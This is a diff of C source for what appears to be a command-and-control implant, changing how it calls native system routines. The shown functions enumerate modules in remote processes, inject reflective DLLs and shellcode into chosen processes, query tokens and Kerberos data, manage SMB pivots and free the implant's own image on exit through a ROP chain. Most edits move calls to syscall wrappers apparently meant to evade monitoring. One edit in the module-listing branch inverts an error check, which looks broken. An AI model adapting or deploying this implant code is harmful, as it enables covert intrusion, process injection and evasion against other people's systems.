@@ -284,23 +284,23 @@ VOID CommandProc( PPARSER Parser )
 
     switch ( SubCommand )
     {
-        case DEMON_COMMAND_PROC_MODULES: PUTS("Proc::Modules")
+        case DEMON_COMMAND_PROC_MODULES: PUTS( "Proc::Modules" )
         {
             PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
             UINT32                    ProcessID        = 0;
-            HANDLE                    hProcess         = NULL;
-            HANDLE                    hToken           = NULL;
+            HANDLE                    hProcess         = NtCurrentProcess();
             NTSTATUS                  NtStatus         = STATUS_SUCCESS;
 
-            if ( Parser->Length > 0 )
+            if ( Parser->Length > 0 ) {
                 ProcessID = ParserGetInt32( Parser );
-            else
-                ProcessID = Instance.Session.PID;
+                hProcess  = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
+                if ( hProcess ) {
+                    PACKAGE_ERROR_WIN32
+                    break;
+                }
+            }
 
-            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
-            Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );
-
-            NtStatus = Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
+            NtStatus = SysNtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
             if ( NT_SUCCESS( NtStatus ) )
             {
                 PPEB_LDR_DATA           LoaderData              = NULL;
@@ -312,18 +312,18 @@ VOID CommandProc( PPARSER Parser )
 
                 PackageAddInt32( Package, ProcessID );
 
-                if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
+                if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                 {
                     ListHead = & LoaderData->InMemoryOrderModuleList;
 
                     Size = 0;
-                    if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
+                    if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
                     {
                         while ( ListEntry != ListHead )
                         {
-                            if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
+                            if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
                             {
-                                Instance.Syscall.NtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );
+                                SysNtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );
 
                                 if ( CurrentModule.FullDllName.Length > 0 ) {
                                     Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );
@@ -343,11 +343,7 @@ VOID CommandProc( PPARSER Parser )
             }
 
             if ( hProcess ) {
-                Instance.Win32.NtClose( hProcess );
-            }
-
-            if ( hToken ) {
-                Instance.Win32.NtClose( hToken );
+                SysNtClose( hProcess );
             }
 
             break;
@@ -389,7 +385,7 @@ VOID CommandProc( PPARSER Parser )
                         if ( ! hProcess )
                             continue;
 
-                        if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) ) {
+                        if ( NT_SUCCESS( SysNtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) ) {
                             if ( TokenQueryOwner( hToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                                 /* well successful called the token user/domain query. continue */
                             }
@@ -402,12 +398,12 @@ VOID CommandProc( PPARSER Parser )
                         PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );
 
                         if ( hProcess ) {
-                            Instance.Win32.NtClose( hProcess );
+                            SysNtClose( hProcess );
                             hProcess = NULL;
                         }
 
                         if ( hToken ) {
-                            Instance.Win32.NtClose( hToken );
+                            SysNtClose( hToken );
                             hToken = NULL;
                         }
 
@@ -476,9 +472,9 @@ VOID CommandProc( PPARSER Parser )
 
             if ( Success )
             {
-                Instance.Win32.NtClose( ProcessInfo.hThread );
+                SysNtClose( ProcessInfo.hThread );
                 if ( ! ProcessPiped )
-                    Instance.Win32.NtClose( ProcessInfo.hProcess );
+                    SysNtClose( ProcessInfo.hProcess );
 
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
@@ -501,7 +497,7 @@ VOID CommandProc( PPARSER Parser )
                 PackageAddInt32( Package, ProcessID );
                 PackageAddInt32( Package, QueryProtec );
 
-                while ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
+                while ( NT_SUCCESS( SysNtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                 {
                     Offset = C_PTR( U_PTR( MemInfo.BaseAddress ) + MemInfo.RegionSize );
 
@@ -539,7 +535,7 @@ VOID CommandProc( PPARSER Parser )
             }
 
             if ( hProcess ) {
-                Instance.Win32.NtClose( hProcess );
+                SysNtClose( hProcess );
                 hProcess = NULL;
             }
 
@@ -560,7 +556,7 @@ VOID CommandProc( PPARSER Parser )
 
             if ( hProcess )
             {
-                Instance.Win32.NtClose( hProcess );
+                SysNtClose( hProcess );
                 hProcess = NULL;
             }
 
@@ -620,7 +616,7 @@ VOID CommandProcList(
             if ( Process != INVALID_HANDLE_VALUE )
             {
                 /* open a process token handle */
-                if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( Process, TOKEN_QUERY, &Token ) ) ) {
+                if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( Process, TOKEN_QUERY, &Token ) ) ) {
                     /* query the username and domain */
                     if ( ! TokenQueryOwner( Token, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                         PUTS( "Failed to get Username and Domain\n" );
@@ -648,16 +644,16 @@ VOID CommandProcList(
             /* ignore this. is just for the debug prints.
              * if we close the handle to our own process we won't see any debug prints anymore */
             if ( U_PTR( SysProcessInfo->UniqueProcessId ) != Instance.Session.PID ) {
-                Instance.Win32.NtClose( Process );
+                SysNtClose( Process );
             }
 #else
             if ( Process ) {
-                Instance.Win32.NtClose( Process );
+                SysNtClose( Process );
             }
 #endif
 
             if ( Token ) {
-                Instance.Win32.NtClose( Token );
+                SysNtClose( Token );
             }
 
             if ( UserDomain.Buffer ) {
@@ -923,7 +919,7 @@ VOID CommandFS( PPARSER Parser )
 
         CleanupUpload:
             if ( hFile ) {
-                Instance.Win32.NtClose( hFile );
+                SysNtClose( hFile );
                 hFile = NULL;
             }
 
@@ -1169,7 +1165,7 @@ VOID CommandInjectDLL( PPARSER Parser )
 
     ProcID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) InjCtx.ProcessID;
 
-    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
+    if ( NT_SUCCESS( NtStatus = SysNtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
     {
         Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
     }
@@ -1229,7 +1225,7 @@ VOID CommandInjectShellcode( PPARSER Parser )
     if ( Inject == 1 )
     {
         /* TODO: instead of using PROCESS_ALL_ACCESS only use VM_OPERATION & PROCESS_CREATE_THREAD */
-        if ( ( InjectionCtx.hProcess = ProcessOpen( TargetPID, PROCESS_ALL_ACCESS ) ) != INVALID_HANDLE_VALUE ) {
+        if ( ( InjectionCtx.hProcess = ProcessOpen( TargetPID, PROCESS_ALL_ACCESS ) ) == INVALID_HANDLE_VALUE ) {
             PACKAGE_ERROR_WIN32
             return;
         }
@@ -1495,7 +1491,7 @@ VOID CommandToken( PPARSER Parser )
 
             /* close handle */
             if ( Token ) {
-                Instance.Win32.NtClose( Token );
+                SysNtClose( Token );
                 Token = NULL;
             }
 
@@ -2958,7 +2954,7 @@ VOID Commandkerberos( PPARSER Parser )
 
             if ( hToken )
             {
-                Instance.Win32.NtClose( hToken );
+                SysNtClose( hToken );
                 hToken = NULL;
             }
 
@@ -3058,7 +3054,7 @@ VOID Commandkerberos( PPARSER Parser )
 
             if ( hToken )
             {
-                Instance.Win32.NtClose( hToken );
+                SysNtClose( hToken );
                 hToken = NULL;
             }
 
@@ -3241,8 +3237,9 @@ VOID CommandExit( PPARSER Parser )
     // remove downloads
     for ( ;; )
     {
-        if ( ! DownloadList )
+        if ( ! DownloadList ) {
             break;
+        }
 
         DownloadEntry = DownloadList;
         DownloadList = DownloadList->Next;
@@ -3273,8 +3270,9 @@ VOID CommandExit( PPARSER Parser )
     // disconnect from all smb pivots
     for ( ;; )
     {
-        if ( ! SmbPivotList )
+        if ( ! SmbPivotList ) {
             break;
+        }
 
         SmbPivotEntry = SmbPivotList;
         SmbPivotList = SmbPivotList->Next;
@@ -3289,8 +3287,9 @@ VOID CommandExit( PPARSER Parser )
     TokenClear();
 
     // terminate the use of the Winsock 2 DLL (Ws2_32.dll)
-    if ( Instance.WSAWasInitialised )
+    if ( Instance.WSAWasInitialised ) {
         Instance.Win32.WSACleanup();
+    }
 
 #if _WIN64
 
@@ -3306,7 +3305,7 @@ VOID CommandExit( PPARSER Parser )
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance.Win32.RtlCaptureContext( &RopExit );
 
-    RopExit.Rip = U_PTR( Instance.Syscall.NtFreeVirtualMemory );
+    RopExit.Rip = U_PTR( Instance.Win32.NtFreeVirtualMemory );
     RopExit.Rsp = U_PTR( ( RopExit.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
     RopExit.Rcx = U_PTR( NtCurrentProcess() );
     RopExit.Rdx = U_PTR( &ImageBase );
@@ -3320,7 +3319,7 @@ VOID CommandExit( PPARSER Parser )
         *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserProcess );
 
     RopExit.ContextFlags = CONTEXT_FULL;
-    Instance.Syscall.NtContinue( &RopExit, FALSE );
+    Instance.Win32.NtContinue( &RopExit, FALSE );
 
 #else
 
